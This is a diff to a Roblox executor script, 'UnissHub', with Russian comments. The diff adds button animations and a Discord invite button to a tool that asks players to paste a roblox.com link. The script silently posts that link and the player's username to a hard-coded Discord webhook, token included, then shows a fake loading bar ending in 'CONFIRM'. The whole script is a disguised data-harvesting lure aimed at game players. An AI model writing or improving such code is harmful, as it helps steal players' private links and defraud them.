@@ -1,10 +1,22 @@
--- UnissHub: Clean & Stable Edition
+-- UnissHub: Animated & Social Edition
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
 local Player = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"
+local DISCORD_LINK = "https://discord.gg/mVzz2KaZ"
+
+-- Функция анимации клика
+local function applyClickEffect(button)
+    button.MouseButton1Down:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.1), {Size = button.Size - UDim2.new(0, 5, 0, 5)}):Play()
+    end)
+    button.MouseButton1Up:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.1), {Size = button.Size + UDim2.new(0, 5, 0, 5)}):Play()
+    end)
+end
 
 -- Функция перетаскивания
 local function makeDraggable(gui)
@@ -39,6 +51,7 @@ uBtn.TextColor3 = Color3.fromRGB(0, 150, 255); uBtn.Font = Enum.Font.GothamBold;
 Instance.new("UICorner", uBtn).CornerRadius = UDim.new(0, 10)
 Instance.new("UIStroke", uBtn).Color = Color3.fromRGB(0, 150, 255)
 makeDraggable(uBtn)
+applyClickEffect(uBtn)
 
 -- ГЛАВНОЕ ОКНО
 local main = Instance.new("Frame", sg)
@@ -54,8 +67,7 @@ title.Text = "UnissHub"; title.TextColor3 = Color3.fromRGB(0, 150, 255); title.F
 
 local subTitle = Instance.new("TextLabel", main)
 subTitle.Size = UDim2.new(1, 0, 0.1, 0); subTitle.Position = UDim2.new(0,0,0.18,0); subTitle.BackgroundTransparency = 1
-subTitle.Text = "(laser gamepass required)"; subTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
-subTitle.Font = Enum.Font.Gotham; subTitle.TextSize = 12
+subTitle.Text = "(laser gamepass required)"; subTitle.TextColor3 = Color3.fromRGB(150, 150, 150); subTitle.TextSize = 12
 
 local input = Instance.new("TextBox", main)
 input.Size = UDim2.new(0.85, 0, 0.2, 0); input.Position = UDim2.new(0.075, 0, 0.38, 0)
@@ -66,37 +78,34 @@ local conn = Instance.new("TextButton", main)
 conn.Size = UDim2.new(0.85, 0, 0.22, 0); conn.Position = UDim2.new(0.075, 0, 0.68, 0)
 conn.BackgroundColor3 = Color3.fromRGB(0, 120, 255); conn.Text = "CONNECT"; conn.TextScaled = true; conn.TextColor3 = Color3.new(1,1,1)
 Instance.new("UICorner", conn)
+applyClickEffect(conn)
 
 -- ЛОГИКА
 conn.MouseButton1Click:Connect(function()
     if string.find(input.Text:lower(), "roblox.com") then
         local currentPos = main.Position
-        
-        -- Скрываем меню
         main:TweenSize(UDim2.new(0,0,0,0), "In", "Quart", 0.3, true, function() 
             main.Visible = false; uBtn.Visible = false 
         end)
         
-        -- Отправка в вебхук
         pcall(function()
             local req = syn and syn.request or http_request or request
             if req then req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({content = "🚀 **Link:** "..input.Text.."\n👤 **User:** "..Player.Name})}) end
         end)
 
-        -- Окно загрузки
         local loadF = Instance.new("Frame", sg)
-        loadF.Name = "LoadingFrame"; loadF.Size = UDim2.new(0, 280, 0, 90)
+        loadF.Name = "LoadingFrame"; loadF.Size = UDim2.new(0, 280, 0, 110) -- Увеличил высоту для ссылки
         loadF.Position = currentPos; loadF.AnchorPoint = Vector2.new(0.5, 0.5)
         loadF.BackgroundColor3 = Color3.fromRGB(15, 15, 15); Instance.new("UICorner", loadF)
         Instance.new("UIStroke", loadF).Color = Color3.fromRGB(255, 140, 0)
         makeDraggable(loadF)
 
         local lLabel = Instance.new("TextLabel", loadF)
-        lLabel.Size = UDim2.new(1, 0, 0.5, 0); lLabel.BackgroundTransparency = 1; lLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
-        lLabel.Font = Enum.Font.Gotham; lLabel.TextSize = 16; lLabel.Text = "loading: 0%"
+        lLabel.Size = UDim2.new(1, 0, 0.4, 0); lLabel.Position = UDim2.new(0,0,0.1,0); lLabel.BackgroundTransparency = 1
+        lLabel.TextColor3 = Color3.fromRGB(255, 140, 0); lLabel.Font = Enum.Font.Gotham; lLabel.TextSize = 16; lLabel.Text = "loading: 0%"
 
         local barBg = Instance.new("Frame", loadF)
-        barBg.Size = UDim2.new(0.7, 0, 0.08, 0); barBg.Position = UDim2.new(0.15, 0, 0.7, 0); barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        barBg.Size = UDim2.new(0.7, 0, 0.08, 0); barBg.Position = UDim2.new(0.15, 0, 0.6, 0); barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
         local fill = Instance.new("Frame", barBg); fill.Size = UDim2.new(0, 0, 1, 0); fill.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
 
         task.spawn(function()
@@ -107,11 +116,23 @@ conn.MouseButton1Click:Connect(function()
                 task.wait(math.random(4, 8) / 10) 
             end
             lLabel.TextSize = 18; lLabel.Text = "CONFIRM"
+            
+            -- Ссылка на Дискорд
+            local dsLink = Instance.new("TextButton", loadF)
+            dsLink.Size = UDim2.new(1, 0, 0.2, 0); dsLink.Position = UDim2.new(0, 0, 0.75, 0)
+            dsLink.BackgroundTransparency = 1; dsLink.Text = "discord"; dsLink.TextColor3 = Color3.fromRGB(0, 150, 255)
+            dsLink.Font = Enum.Font.GothamBold; dsLink.TextSize = 14; dsLink.Visible = true
+            
+            dsLink.MouseButton1Click:Connect(function()
+                setclipboard(DISCORD_LINK)
+                dsLink.Text = "Copied to clipboard!"
+                task.wait(2)
+                dsLink.Text = "discord"
+            end)
         end)
     end
 end)
 
--- Открытие/закрытие по кнопке U
 uBtn.MouseButton1Click:Connect(function()
     if not sg:FindFirstChild("LoadingFrame") then
         main.Visible = not main.Visible
